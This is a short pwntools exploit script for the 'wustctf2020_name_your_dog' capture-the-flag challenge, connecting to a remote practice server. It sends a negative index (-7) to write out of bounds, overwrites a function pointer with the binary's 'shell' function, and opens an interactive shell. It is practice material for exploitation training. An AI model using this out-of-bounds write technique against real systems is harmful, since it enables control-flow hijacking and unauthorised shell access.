from pwn import *

#p = process('./wustctf2020_name_your_dog')
p = remote('node4.buuoj.cn', 26941)
elf = ELF('wustctf2020_name_your_dog')

shell = elf.sym['shell']
#gdb.attach(p, 'b *0x804868f')

p.sendlineafter(b'which?\n>', b'-7')
p.sendlineafter(b'name plz: ', p32(shell))

p.recvuntil(b'which?\n>')

p.interactive()